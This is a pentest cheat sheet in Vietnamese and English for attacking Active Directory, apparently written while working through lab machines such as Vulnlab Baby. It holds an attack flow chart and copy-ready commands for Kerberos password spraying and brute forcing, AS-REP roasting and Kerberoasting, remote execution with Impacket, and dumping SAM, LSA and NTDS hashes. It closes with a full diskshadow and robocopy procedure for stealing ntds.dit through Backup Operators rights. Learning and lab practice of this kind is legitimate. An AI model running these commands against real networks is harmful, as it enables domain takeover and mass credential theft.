# **\#Tài liệu tham khảo**:

- **Click here**:
    [HackTricks - HackTricks](https://book.hacktricks.wiki/en/index.html)
    [Ethical-Hacking/Windows Pentesting with OffSec at main · davidbombal/Ethical-Hacking · GitHub](https://github.com/davidbombal/Ethical-Hacking/blob/main/Windows%20Pentesting%20with%20OffSec)
    [A Pentester Guide to LDAP Bind Method Vulnerabilities \| Cobalt](https://www.cobalt.io/blog/pentester-guide-ldap-bind-method-vulnerabilities)
    [THM Walkthrough list & AD stuff. TL;DR I decided to put our list of… \| by Rich \| Medium](https://happycamper84.medium.com/thm-walkthrough-list-ad-stuff-95280f400bec)
    [Securing AD Backups. TL;DR Backup Operators, offline AD… \| by Rich \| Medium](https://happycamper84.medium.com/securing-ad-backups-8804b31da9fd)
---
# \#Red team AD attack
## Techniques & Tool summmry
(==High-level== list; use ==for== orientation ==only== - ==no== exploit steps)
- **Click here**:
    - Scanning: nmap, RustScan, masscan
    - SMB/AD enum: smbclient, enum4linux, CrackMapExec, rpcclient
    - LDAP/AD: ldapsearch, PowerView, BloodHound/SharpHound
    - Kerberos attacks: kerbrute (enum/spray), GetUserSPNs (Kerberoast), GetNPUsers (==AS-REP==)
    - Ticket tools: Rubeus, Mimikatz (==for== tkt manipulation/concepts)
    - Remote ==exec== & creds: Impacket suite (psexec, wmiexec, smbexec), evil-winrm
    - Credential dumping: secretsdump (Impacket), mimikatz, procdump (helper)
    - ==Local== priv esc checks: winPEAS, LinPEAS, PowerUp
    - Poisoning / LLMNR: Responder, Inveigh
    - Crack hashes: hashcat, john (offline cracking)
    - Mapping & ACL analysis: BloodHound, PowerView
    - Post-exploitation helpers: Metasploit framework (conceptual), custom scripts


## Detection & Defense notes
- **Click here**:
    - Monitor: unusual Kerberos ==AS-REQ==/==AS-REP==/TGS activity (Event IDs), many ==AS-REP== requests, many SPN requests.
    - Alert ==on==: DCSync-==like== operations, abnormal service creation, scheduled tasks creation, LSASS dumps, mass hash exfiltration.
    - Hardening:
        - Enforce strong passwords & rotation
        - Disable "Do not require preauth" usage
        - Limit service account privileges; use managed service accounts
        - Monitor ==and== restrict replication rights
        - Apply LAPS ==for local== admin management
        - Enable MFA ==for== high-priv accounts.
    - Least privilege & ACL hygiene recommended; reduce exposure ==of== high-priv creds on endpoints.

## Quick Decision cheat-sheet
- **Click here**:
    - If you have a ==domain user== ==**only**==: look ==for== SPNs (Kerberoast) and ==AS-REP== roastable users.
    - If you have ==local== admin ==on== a host: enumerate local creds, dump LSASS/SAM, escalate to domain creds.
    - If you have NTLM hashes: consider Pass-the-Hash ==for lateral== movement.
    - If you get krbtgt hash: Golden Ticket -> ==full== domain persistence (high impact).
    - Always weigh noise: ticket forging ==and== DCSync ==are== very noisy; credential theft from endpoints can be stealthier.

## Flow Chart
- **Click here**:
    
    +---------------------------------------------------------------------+  
    | ==**0**==**) RULES** ==**OF**== **ENGAGEMENT / SAFETY**  
    | - Xác nhận explicit permission (==scope==, rules, ==time== ==window==).  
    | - Logging, containment, ==out-of-scope== hosts.  
    | - Backup & cleanup plan.  
    +---------------------------------------------------------------------+  
    |  
    v  
    +---------------------------------------------------------------------+  
    | ==**1**==**) ENUMERATION (Reconnaissance / Mapping)**  
    | Purpose: biết cấu trúc AD, máy nào là DC, ==user==/==group==, services.  
    +---------------------------------------------------------------------+  
    |---> ==**1**==**A: Network & Service Discovery**  
    | - Goal: tìm DCs, hosts, ports (Kerberos, LDAP, SMB, RDP).  
    | - Tools (scan): nmap, masscan, RustScan.  
    | - Notes: watch ==for== filtered ports, firewalls.  
    |  
    |---> ==**1**==**B: AD / LDAP enumeration (if accessible)**  
    | - Goal: ==users==, ==groups==, computers, OU, SPNs, ACLs, trusts.  
    | - Tools: ldapsearch, lookupsid (Impacket), BloodHound/SharpHound, PowerView  
    | - Output: ==user== list, SPN list, ACL mapping (who can do what).  
    |  
    |---> ==**1**==**C: SMB / File Shares**  
    | - Goal: list shares, writable locations, admin shares.  
    | - Tools: smbclient, CrackMapExec, enum4linux.  
    |  
    |---> ==**1**==**D: Service / Process / Binary Info (post-compromise)**  
    | - Goal: find services, ==binary== paths, service accounts.  
    | - Tools: PowerShell (==Get==-CimInstance Win32_Service), sysinternals.  
    |  
    |---> ==**1**==**E: Kerberos-specific checks**  
    | - Identify accounts ==with== SPNs (candidates ==for== Kerberoast).  
    | - Identify accounts ==with== "Do not require preauth" (==AS-REP==).  
    | - Tools: GetUserSPNs (Impacket), GetNPUsers (Impacket), kerbrute.
    |  
    |---> **Outputs (to use later)**:  
    | - Valid ==user== list, SPN candidates, DC IPs, share list, ACLs.  
    |  
    v  
    +---------------------------------------------------------------------+  
    | Decision: Have ==initial== credentials ==or== foothold?  
    | - ==**YES**== -> go ==to== **[**==**2**==**A]** (use creds ==to== access)  
    | - ==**NO**== -> go ==to== **[**==**2**==**B]** (try non-cred techniques)  
    +---------------------------------------------------------------------+
    
    ## If ==YES==: use credentials
    
    **[**==**2**==**A]** ==**INITIAL**== **ACCESS** ==**with**== **CREDENTIALS**  
    |  
    |---> ==**2**==**A.1: Domain user creds available**  
    | - Use ==for==: WinRM, SMB, RDP, LDAP enumeration, service access.  
    | - Tools: evil-winrm, CrackMapExec, smbclient, RDP clients.
    | - Use-==case==: run commands, enumerate more, test privilege level.  
    |  
    |---> ==**2**==**A.2: Local account on host**  
    | - Access that host ==only== (unless hash reuse).  
    | - ==Check for== stored creds, tokens, service accounts.  
    |  
    |---> ==**2**==**A.3: If only hash (NTLM) available**  
    | - Consider pass-the-hash style techniques (authentication ==with== hash).  
    | - Tools: Impacket (psexec/wmiexec with hashes), mimikatz for tokens.
    |  
    v  
    Continue ==to== **[**==**3**==**]** Privilege Escalation (==from== compromised host / creds)
    
    ## If ==NO==: no creds yet
    
    **[2B]** ==**INITIAL**== **ACCESS** ==**without**== **CREDENTIALS (Acquire creds)**  
    |  
    |---> ==**2**==**B.1: Credential Harvesting / Poisoning**  
    | - LLMNR/NBT-NS/MDNS poisoning ==to== capture hashes.  
    | - Tools: Responder, Inveigh, mitm6.  
    | - Output: captured NTLM challenge/response hashes.  
    |  
    |---> ==**2**==**B.2: Password Spraying / User Enumeration**  
    | - ==Large==-scale low-rate password guesses ==to== avoid lockout.  
    | - Tools: kerbrute, CrackMapExec, lookupsid (Impacket) to enumerate.
    |  
    |---> ==**2**==**B.3: Kerberos Enumeration Attacks (no creds needed for some)**  
    | - ==AS-REP== Roasting: find accounts ==with no== pre-auth => request ==AS-REP== hashes.  
    | * Tool: GetNPUsers (Impacket)
    | - Kerberoasting: needs a domain account (but ==not== necessarily high privilege)  
    | * Tool: GetUserSPNs (Impacket), Rubeus
    | - Outcome: hashes/tickets ==to== crack offline => may yield creds.  
    |  
    |---> ==**2**==**B.4: Public/External Vectors (Phishing, Web RCE, Exploits)**  
    | - Phishing emails ==to== harvest creds.  
    | - Exploit internet-facing services/applications.  
    |  
    v  
    If creds obtained -> go ==to== **[**==**2**==**A]**, ==else== repeat techniques/expand scope.
    
    +---------------------------------------------------------------------+  
    | ==**3**==**) PRIVILEGE ESCALATION (**==**Local**== **& Domain)**  
    | Purpose: increase privileges ==from== normal ==user== => ==local== admin => domain  
    +---------------------------------------------------------------------+
    
    (Context: you ==are on== a host (==local==) ==or== have domain creds; enumerate ==and== choose path)
    
    |---> ==**3**==**A: Local Privilege Escalation (on host you control)**  
    | - Goal: become ==local SYSTEM==/root ==on== that host.  
    | - High-level techniques:  
    | * Misconfigured services (writable ==binary==, insecure PATH)  
    | * SUID/Capabilities ==on== Linux; SUID binaries ==on== Windows service misconfig  
    | * Scheduled tasks ==with== weak permissions  
    | * Exploits ==for== kernel ==or== service vulnerabilities  
    | - Tools: [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS), [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), JuicyPotato/PrintSpoofer family (conceptual), [GTFOBins](https://gtfobins.github.io/) lists  
    | - Output: ==SYSTEM==/==local== admin ==on== host -> can dump credentials ==from== memory / files.
    |  
    |---> ==**3**==**B: Credential extraction (post local-priv)**  
    | - Dump LSASS, SAM, ==SYSTEM==, LSA secrets ==to get== domain-level creds.  
    | - Tools: mimikatz, secretsdump (Impacket), procdump (==as== helper)  
    | - Notes: requires high privileges; noisy.  
    |  
    |---> ==**3**==**C: Domain Privilege Escalation (from domain-aware access)**  
    | - Kerberoasting:  
    | * ==Condition==: SPN assigned ==to== account (service account).  
    | * Action: request service ticket ⇒ crack offline ⇒ ==get== service account password.  
    | * Tool: GetUserSPNs (Impacket), Rubeus; crack with Hashcat/John.
    | - ==AS-REP== Roasting:  
    | * ==Condition==: account flagged "Do not require pre-auth".  
    | * Action: request ==AS-REP===> extract encrypted ==blob===> crack offline.  
    | * Tool: GetNPUsers (Impacket).
    | - ACL abuse:
    | * ==Condition==: improper ACLs allow write/modify ==on user== objects ==or== servicePrincipalName.  
    | * Action: exploit ==to set== SPN / change password / ==add== privileges.  
    | * Tools: BloodHound ==to== find paths, PowerView ==to== abuse.  
    | - DCSync:  
    | * ==Condition==: account has Replication rights (Replicate Directory Changes).  
    | * Action: request DC ==to== replicate creds (NTDS).  
    | * Tools: mimikatz DCSync, secretsdump (==with== DCSync)  
    |  
    |---> ==**3**==**D: Ticket Forging (after acquiring appropriate keys/hashes)**  
    | - Silver Ticket:  
    | * Requires: service account hash  
    | * Effect: forge service tickets ==to== access ==specific== services  
    | - Golden Ticket:  
    | * Requires: **krbtgt** NTLM hash  
    | * Effect: forge TGTs ==for== virtually ==any== domain account (Domain Admin potential)  
    | - Diamond Ticket:  
    | * Variant ==of== Golden ==with== different PAC creation flow (advanced)  
    | - Tools: Mimikatz, Rubeus (conceptual)  
    |  
    v  
    Decision: Have domain admin ==or== **krbtgt**? --> If yes -> **[**==**5**==**]** DC Compromise / Full Domain Control  
    Else if ==local SYSTEM on== many hosts ==or== service accounts cracked -> go ==to== **[**==**4**==**]** Lateral Movement
    
    +---------------------------------------------------------------------+  
    | ==4==) ==**LATERAL**== **MOVEMENT (Move across network** ==**to**== **more valuable hosts)**  
    | Purpose: reach DCs, ==high-value== servers, data stores, ==or== persistence  
    +---------------------------------------------------------------------+
    
    |---> ==**4**==**A: Credential reuse / Pass-the-Hash**  
    | - Use harvested NTLM hashes ==to== authenticate ==to== other hosts.  
    | - Tools: Impacket psexec/wmiexec, CrackMapExec.  
    |  
    |---> ==**4**==**B: Pass-the-Ticket**  
    | - Use stolen TGT/TGS ==to== access resources ==without== plaintext creds.  
    | - Tools: Mimikatz (ptt), Rubeus.  
    |  
    |---> ==**4**==**C: Remote Exec & Admin Tools**  
    | - WinRM (evil-winrm), WMI, PsExec, SSH, RDP.  
    | - Move ==to== hosts ==where== domain admin logins occurred ==to== harvest more creds.  
    |  
    |---> ==**4**==**D: Service account takeover**  
    | - After Kerberoast ==or== secretsdump, use service account creds ==to== access services ==or== hosts.  
    |  
    |---> ==**4**==**E: Scheduler / Persistence for lateral actions**  
    | - ==Create== scheduled tasks ==or== services ==to== run commands/payloads across hosts.  
    |  
    v  
    Loop: repeat **[**==**3**==**]** & **[**==**4**==**]** until DC reachable / ==high-value== creds found.
    
    +---------------------------------------------------------------------+  
    | ==5==) DOMAIN CONTROLLER (DC) COMPROMISE & DOMAIN TAKEOVER  
    | Purpose: obtain ==or== fabricate creds that give near-total control  
    +---------------------------------------------------------------------+
    
    |---> ==**5**==**A: If you can reach DC with SYSTEM or Replication rights**:  
    | - Dump **NTDS.dit** + ==SYSTEM== (offline) -> extract ==all== NTLM hashes.  
    | - Tools: secretsdump (offline), ntdsutil, VSS-related helpers (conceptual)  
    |  
    |---> ==**5**==**B: Obtain krbtgt NTLM hash (from dump)**  
    | - Use ==to== craft Golden Tickets -> ==full== domain access (long-lived)  
    |  
    |---> ==**5**==**C: Post-DC actions (once DA)**:  
    | - ==Create== persistent high-priv accounts.  
    | - Backdoor GPOs, schedule tasks, change adminSDHolder ==as== persistence.  
    | - Exfiltrate data, pivot ==to== other networks.  
    |  
    |---> ==**5**==**D: Clean up considerations (if allowed by RoE)**  
    | - Remove artifacts, remove created accounts/services, restore logs if necessary.  
    |  
    v  
    +---------------------------------------------------------------------+  
    | ==**6**==**) PERSISTENCE & EVASION**  
    | - Golden/Silver tickets can be used ==for== stealthy long-term access.  
    | - Backdoor ==groups==, service accounts, scheduled tasks ==for== persistence.  
    | - Be mindful: Golden Tickets ==are== noisy if ==not== careful (event anomalies).  
    +---------------------------------------------------------------------+
    
---
# \#Network Scanning
```Bash
nmap -p- -Pn <ip> -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3 --open -oN nmap_ports.txt
```
```Bash
nmap -Pn <ip> -sV -v -T5 --min-rate 1500 --max-rtt-timeout 500ms --max-retries 3
```
```Bash
nmap -T5 -sV <ip> -sC -v --script vuln -oN nmap_vuln-txt
```
```Bash
rustscan --ulimit 5000 -a <ip> -- -sC -sV -Pn -oN nmap_full
```
```Bash
rustscan --ulimit 5000 -a <target> -- -A
```
---

## DNS Pentesting

### Any record

```Bash
dig ANY target.com @<DNS_IP>
```

### Zone Transfer

```Bash
dig axfr @<DNS_IP>
```

```Bash
dig axfr @<DNS_IP> <DOMAIN>
```

---

# \#Liệt kê SMB ẩn danh
```Bash
smbclient -L //<IP or hostname> [-U <username>] [-N]
```
> [!important]
> 
> ```Bash
> smbclient -L //192.168.1.10 -N \#Kết nối ẩn danh
> ```
> 
> ```Bash
> smbclient -L //192.168.1.10 -U admin \#Bị hỏi pass
> ```
> 
> ```Bash
> smbclient -L //fileserver -U "DOMAIN\username” \#domain + use
> ```
---
# \#LDAP
## Pentesting Anonymous Bind Vulnerabilities
```Bash
ldapsearch -x -H ldap://<LDAP_SERVER> -b "<BASE_DN>"
```
> [!important]
> 
> ```Bash
> ldapsearch -x -H ldap://10.10.121.48 -b "DC=baby,DC=vl”
> ```
---
# \#NetExec
```Bash
nxc smb <target> -u <username> -p <password> --shares
```
> [!important]
> 
> ```Bash
> nxc ldap 10.10.121.48 -u alice -p Winter2024! --shares --users
> ```
> Danh sách các **share** như ADMIN$, C$, Users, SharedDocs, … và **quyền** của user đối với từng share
---
# \#SMBpasswd
> [!important] Đổi mật khẩu SMB/Windows user qua mạng. Tình huống trong lab Baby (Vulnlab) là đã tìm được credential nhưng khi dùng NetExec kiểm tra thì "STATUS_PASSWORD_MUST_CHANGE" nên cần đổi.
```Bash
smbpasswd -r <server> -U <username>
```
> [!important]
> 
> ```Bash
> smbpasswd -r 10.10.121.48 -U 'Caroline.Robinson'
> ```
---
# \#SMBclient
```Bash
smbclient //<server>/<share> [-U [domain/]username] [options]
\#or
smbclient \\\\<target>\\<share> -U <username>
```
> [!important]
> 
> ```Bash
> smbclient \\\\10.10.121.48\\backup -U 'svc-admin'
> ```

> [!important]
> 
> ```Bash
> smbclient \\\\$target\\NETLOGON -U vulnnet-rst.local\\t-skid
> ```
- **Ví dụ**:
    ## Domain user
    ```Bash
    smbclient //10.10.121.48/ADMIN$ -U baby.vl/caroline.robinson
    ```
    
    ## Local user
    ```Bash
    smbclient //10.10.121.48/C$ -U administrator
    ```
    
    ## Anonymous
    ```Bash
    smbclient //10.10.121.48/public -N
    ```
## Enumerate SMB
```Bash
smbclient -L \\\\$target
```
---
# \#Evil-WinRM
```Bash
evil-winrm -i <ip> -u <username> -p <password> [-d <domain>]
```
> [!important]
> 
> ```Bash
> evil-winrm -i baby.vl -u caroline.robinson -p 'HackSmarter123!' -d baby.vl \#Domain
> ```
> 
> ```Bash
> evil-winrm -i 10.10.121.48 -u caroline.robinson -p 'HackSmarter123!' -d baby.vl \#IP
> ```

> Mặc định dùng port 5985 (HTTP), nếu target bật WinRM HTTPS (5986) thì cần thêm **-S** và **-P 5986**
---
# \#RDP connections
```Bash
xfreerdp3 /u:<username> /p:<password> /d:<domain-name> /v:<IP-address> /w:1920 /h:1080 /fonts /smart-sizing
```
---
# \#rpcclient
```Bash
rpcclient -U <username> <target>
\#or
rpcclient -N <target> \#Anonymous
```
> [!important]
> 
> ```Bash
> rpcclient -U "" -N 10.10.10.5 \#Anonymous
> ```
> 
> ```Bash
> rpcclient -U 'administrator%Password123' 192.168.1.10 \#user + pass
> ```
- **Một số lệnh hữu ích rpcclient**:
    ```Bash
    enumdomusers         # Liệt kê tất cả user trong domain
    enumdomgroups        # Liệt kê tất cả group
    queryuser <RID>      # Lấy thông tin chi tiết user theo RID
    lookupnames <name>   # Tìm RID từ tên user/group
    lookupsids <SID>     # Tìm tên từ SID
    getdompwinfo         # Thông tin chính sách mật khẩu domain
    srvinfo              # Thông tin server
    ```
---
# **\#Initial Windows enumeration commands**
```Bash
hostname
```
```Bash
whoami
```
```Bash
whoami /groups
```
> Liệt kê tất cả các **groups** mà user hiện tại **thuộc về**, giúp phát hiện quyền cao.  
> Xác nhận **groups** user đã có sau khi lấy quyền cao hơn.
```Bash
net user
```
> Liệt kê tất cả các **local users**
```Bash
whoami /priv
```
> [!important]
> 
> ```Bash
> whoami /priv | findstr /i "SeImpersonatePrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeLoadDriverPrivilege" \#Nếu chỉ cần đọc các quyền có thể khai thác
> ```
- **SeImpersonatePrivilege**
Có thể dùng Juicy Potato, Rogue Potato, PrintSpoofer ⇒ leo lên SYSTEM
- **SeBackupPrivilege** / SeRestorePrivilege
Cho phép sao lưu hoặc khôi phục file, kể cả khi không có NTFS permissions ⇒ có thể đọc
- **SeTakeOwnershipPrivilege**
Cho phép chiếm quyền sở hữu file hoặc key registry ⇒ chỉnh sửa quyền
- **SeDebugPrivilege**
Cho phép gắn debugger vào process ⇒ inject vào process SYSTEM
- **SeLoadDriverPrivilege**
Nạp driver tùy ý ⇒ thực thi code ở kernel level

## Enumeration running services
```Bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}
```

## Enumerate specific service
```Bash
Get-CimInstance -ClassName Win32_Service | Select Name,DisplayName
```
```Bash
Get-CimInstance -ClassName Win32_Service -Filter "Name='<ServiceName>'" | Select-Object <Thuộc_tính1>, <Thuộc_tính2>, ...
```
> [!important]
> 
> ```Bash
> Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode
> ```
> 
> ```Bash
> Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object Name, DisplayName, State, StartMode, PathName, StartName
> ```

## Service binary enumeration
```Bash
icacls <path>
```
> [!important]
> 
> ```Bash
> icacls "C:\xampp\apache\bin\httpd.exe”
> ```
> 
> ```Bash
> icacls "C:\xampp\mysql\bin\mysqld.exe”
> ```

> Hiển thị Access Control List (**ACL**) của file hoặc folder

## Get-ChildItem (Tìm file, không hẳn là là enum)
```Bash
Get-ChildItem -Path <Directory> -Include <Pattern> -Recurse | Get-Content
```
> [!important]
> 
> ```Bash
> Get-ChildItem -Path C:\ -Include *flag*.txt -Recurse -ErrorAction SilentlyContinue | Get-Content
> ```
```Bash
Get-Content
type C:\Users\Administrator\Desktop\root.txt
```
---
# \#Kerbrute
```Bash
kerbrute userenum -d <DOMAIN> [--dc <DomainController>] [OPTIONS] <UserListFile>
```
> [!important]
> 
> ```Bash
> kerbrute userenum -d example.local --dc 192.168.1.10 users.txt -t 5 -o valid_users.txt \#Enumerate user hợp lệ
> ```
> 
> ```Bash
> kerbrute passwordspray -d example.local --dc dc.example.local valid_users.txt "Winter2025!" \#Khi đã biết password
> ```
> 
> ```Bash
> kerbrute bruteforce -d example.local userpass.txt \#Bruteforce password
> ```

> [!important]
> 
> ```Bash
> kerbrute userenum userlist.txt --dc $target -d spookysec.local
> ```
> 
> Trong ví dụ này, sau khi thực thi lệnh thì tìm được một user tên svc-admin và nhảy ra hash, ta cần brute-force nó (có thể dùng john).
---

# \#Impacket
> Python scripts & thư viện hỗ trợ khai thác và tương tác với các giao thức mạng, đặc biệt là của Windows/Active Directory.
## Enumeration
### AS-REP Roasting
> Tìm user có “Do **not** require **Kerberos preauthentication**” bật
```Bash
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile <UserList> -format hashcat -outputfile hashes.txt
```
> [!important]
> 
> ```Bash
> impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> \ -usersfile <UserList> \ -format hashcat \ -outputfile hashes.txt \#Sau đó có thể crack hashes.txt
> ```

### Security Identifier (SID) Enumeration
> SID (Security Identifier) là một chuỗi định danh duy nhất mà Windows (và Active Directory) gán cho mỗi thực thể bảo mật - như user, group, máy tính, hoặc domain. Nó không thay đổi kể cả khi bạn đổi username. Mỗi SID có dạng như: S-1-5-21-3623811015-3361044348-30300820-1013
```Bash
impacket-lookupsid <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> <TARGET_IP> [-hashes <LMHASH>:<NTHASH>]
```
> [!important]
> 
> ```Bash
> impacket-lookupsid MEGACORP/administrator:Passw0rd123@10.10.10.1 10.10.10.1
> ```
---

## Hash / Dumping
### Dump hashes
> Dump SAM, SYSTEM, SECURITY từ máy local/remote
```Bash
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<IP>
```
> [!important]
> 
> ```Bash
> impacket-secretsdump test.local/admin:'Passw0rd!'@10.10.10.1
> ```
> 
> ```Bash
> impacket-secretsdump LOCAL -sam sam.save -system system.save -security security.save
> ```
> 
> ```Bash
> impacket-secretsdump -ntds ntds.dit -system system LOCAL
> ```
---

## Remote command execution
### **WMI** (Windows Management Instrumentation)
> [!important] Thực thi lệnh từ xa qua giao thức WMI mà không cần mở một phiên shell tương tác giống như WinRM hay PsExec
```Bash
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<IP>
```
```Bash
impacket-smbexec <DOMAIN>/<USER>:<PASS>@<IP>
```
```Bash
impacket-psexec <DOMAIN>/<USER>:<PASS>@<IP>
```

> [!important]
> 
> ```Bash
> impacket-psexec.py spookysec.local/Administrator:Pass123!@$target
> ```
---
## Kerberos
> Tìm SPN để lấy **TGS** hash
```Bash
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
```
> [!important]
> 
> ```Bash
> impacket-GetUserSPNs test.local/john.doe:Password123 -dc-ip 10.10.10.1 -request
> ```
> 
> ```Bash
> impacket-GetUserSPNs -dc-ip $target 'spookysec.local/svc-admin:management2005' -request
> ```
---
## SMB / LDAP
```Bash
impacket-lookupsid <DOMAIN>/<USER>:<PASS>@<IP>
```
```Bash
impacket-smbclient <DOMAIN>/<USER>:<PASS>@<IP>
```
---
# \#CrackMapExec (CME)
```Bash
crackmapexec smb <target> -u <username> -p <password> <options>
\#or
cme smb <target> -u <username> -p <password> <options>
```
> [!important]
> 
> ```Bash
> crackmapexec smb 10.10.121.48 -u 'svc-admin' -p 'management2005' --shares
> ```
- **Các options**:
    - --shares : Liệt kê các thư mục chia sẻ SMB mà **user** có quyền truy cập
    - --users : Liệt kê tất cả các **user** trong domain hoặc trên máy local mà **user hiện tại** có quyền query
    - --groups : Liệt kê các **groups** trên máy hoặc trong domain
    - --rid-brute : bruteforce RID (Relative Identifier) để liệt kê **toàn bộ** tài khoản **user** và **group** trên máy hoặc domain
    - --sessions : Hiển thị **phiên đăng nhập SMB hiện tại** trên mục tiêu (phát hiện user cao cấp đang đăng nhập, có thể thực hiện lateral movement)
    - --loggedon-users : Liệt kê tất cả các **user** đang đăng nhập vào máy mục tiêu (local + domain)
    - --sam : Dump cơ sở dữ liệu **SAM** (Security Account Manager) chứa hash của local accounts
    - --lsa : Dump thông tin từ **LSA Secrets** (Local Security Authority), có thể chứa plaintext password
    - --ntds : Dump **NTDS.dit** (CSDL chứa hash tất cả tài khoản domain)
    - --exec-method : Chỉ định **phương thức** thực thi lệnh từ xa qua SMB (mặc định là smbexec, ngoài ra có atexec, wmiexec)
    - -x : Thực thi lệnh từ xa, **trả về output**
    - -X : Thực thi lệnh từ xa **không trả về output**
---
# John the Ripper
- **Các options**:
    - --format=krb5tgs
    - --format=krb5asrep
---
# \#PriveSec Window method
## Backup Operators
```Bash
whoami /all
```
> [!important]
> 
> ```Bash
> BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
> SeBackupPrivilege             Back up files and directories  Enabled
> SeRestorePrivilege            Restore files and directories  Enabled
> ```
Đầu tiên, tạo một file **backup.txt** trên máy Linux
```Bash
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backup
```
Dùng evil-winrm hoặc các phương thức mở shell khác, wmi
```Bash
mkdir C:\Temp
cd C:\Temp
upload backup.txt \#Nhớ điều hướng tới thư mục chứa backup.txt trước trên máy Linux
diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit
reg save hklm\system c:\temp\system
dir
download ntds.dit
download system
```
Sau đó có thể dùng impacket-secretsdump để dump ra hash.